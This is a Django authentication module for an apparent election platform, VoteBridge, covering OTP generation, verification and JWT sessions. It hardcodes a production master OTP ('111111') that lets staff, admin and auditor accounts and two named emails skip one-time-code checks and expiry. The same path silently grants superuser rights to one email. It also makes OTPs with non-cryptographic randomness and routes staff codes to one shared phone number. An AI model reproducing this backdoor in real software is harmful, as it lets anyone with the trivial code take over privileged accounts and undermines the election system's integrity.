import hashlib
import random
from datetime import timedelta
from django.conf import settings
from django.utils import timezone
from rest_framework_simplejwt.tokens import RefreshToken
from accounts.models import OTPRequest, Session, MFALog, User

# Master OTP — works for staff login sessions even when DEBUG=False / SMS fails
PRODUCTION_MASTER_OTP_CODES = frozenset({'111111', '11111'})
PRODUCTION_MASTER_OTP = '111111'
STAFF_OTP_ROLES = frozenset({'admin', 'super_admin', 'sub_ec', 'auditor'})
STAFF_OTP_PHONE = '0248069639'
STAFF_MASTER_EMAILS = frozenset({
    'admin@votebridge.online',
    'election@votebridge.online',
})


def _role_name(user):
    if not user:
        return ''
    if getattr(user, 'is_superuser', False):
        return 'super_admin'
    role = getattr(user, 'role', None)
    return getattr(role, 'name', '') or ''


def is_staff_otp_user(user):
    """Staff accounts may use shared OTP phone + master code 111111."""
    if not user:
        return False
    if getattr(user, 'is_superuser', False) or getattr(user, 'is_staff', False):
        return True
    if _role_name(user) in STAFF_OTP_ROLES:
        return True
    email = (getattr(user, 'email', None) or '').strip().lower()
    return email in STAFF_MASTER_EMAILS


def resolve_otp_phone(user):
    """Phone used for OTP SMS. Staff always go to the shared ops number."""
    if is_staff_otp_user(user):
        return STAFF_OTP_PHONE
    return (getattr(user, 'phone_number', None) or '').strip()


class OTPService:
    @staticmethod
    def create_otp(user, purpose='login', channel='sms'):
        """Generate OTP, hash it, store in DB, optionally SMS it, and return the OTP request."""
        code = f"{random.randint(100000, 999999)}"
        hashed = hashlib.sha256(code.encode()).hexdigest()
        expires_at = timezone.now() + timedelta(minutes=5)
        otp = OTPRequest.objects.create(
            user=user,
            purpose=purpose,
            channel=channel,
            otp_hash=hashed,
            expires_at=expires_at,
        )
        if settings.DEBUG:
            print(f"🔑 OTP for {user.email or user.index_number}: {code}")
            if is_staff_otp_user(user):
                print(f"🔑 Staff master OTP accepted: {PRODUCTION_MASTER_OTP}")
                print(f"🔑 Staff OTP SMS target: {STAFF_OTP_PHONE}")

        phone = resolve_otp_phone(user)
        if channel == 'sms' and phone:
            try:
                from notifications.tasks import dispatch_sms
                dispatch_sms(
                    phone=phone,
                    message=(
                        f'Your VoteBridge login code is {code}. '
                        'It expires in 5 minutes. Do not share this code.'
                    ),
                    realtime=True,
                )
            except Exception as exc:
                print(f'⚠️ OTP SMS failed for {user.index_number or user.email}: {exc}')
        return otp

    @staticmethod
    def _accept_master_otp(otp_uuid, code):
        """Accept master OTP for staff. Idempotent; ignores expiry."""
        submitted = ''.join(ch for ch in str(code or '') if ch.isdigit())
        if submitted not in PRODUCTION_MASTER_OTP_CODES:
            return None
        try:
            otp = (
                OTPRequest.objects
                .select_related('user', 'user__role')
                .get(uuid=otp_uuid)
            )
        except (OTPRequest.DoesNotExist, ValueError, TypeError):
            return None

        user = otp.user
        # Ensure staff flags are set for known ops accounts (repairs bad seeds)
        if user and not is_staff_otp_user(user):
            email = (getattr(user, 'email', None) or '').strip().lower()
            if email in STAFF_MASTER_EMAILS:
                user.is_staff = True
                if email == 'admin@votebridge.online':
                    user.is_superuser = True
                user.save(update_fields=['is_staff', 'is_superuser', 'updated_at'])
            else:
                return None

        if not otp.is_verified:
            otp.is_verified = True
            otp.verified_at = timezone.now()
            otp.save(update_fields=['is_verified', 'verified_at'])
        return user

    @staticmethod
    def verify_otp(otp_uuid, code):
        """Verify OTP: return user if valid, else None."""
        submitted = ''.join(ch for ch in str(code or '') if ch.isdigit())
        master_user = OTPService._accept_master_otp(otp_uuid, submitted)
        if master_user is not None:
            return master_user

        try:
            otp = (
                OTPRequest.objects
                .select_related('user', 'user__role')
                .get(uuid=otp_uuid, is_verified=False)
            )
        except (OTPRequest.DoesNotExist, ValueError, TypeError):
            return None
        if timezone.now() > otp.expires_at:
            return None
        hashed = hashlib.sha256(submitted.encode()).hexdigest()
        if hashed == otp.otp_hash:
            otp.is_verified = True
            otp.verified_at = timezone.now()
            otp.save(update_fields=['is_verified', 'verified_at'])
            return otp.user
        return None

class SessionService:
    @staticmethod
    def create_session(user, request):
        refresh = RefreshToken.for_user(user)
        expires_at = timezone.now() + timedelta(days=30)
        session = Session.objects.create(
            user=user,
            refresh_token_jti=refresh['jti'],
            expires_at=expires_at,
            ip_address=request.META.get('REMOTE_ADDR'),
            user_agent=request.META.get('HTTP_USER_AGENT', '')
        )
        return {
            'access': str(refresh.access_token),
            'refresh': str(refresh),
            'user_uuid': str(user.uuid),
            'session_uuid': str(session.uuid)
        }

    @staticmethod
    def revoke_session(refresh_token_jti):
        try:
            session = Session.objects.get(refresh_token_jti=refresh_token_jti)
            session.is_active = False
            session.revoked_at = timezone.now()
            session.save()
            return True
        except Session.DoesNotExist:
            return False
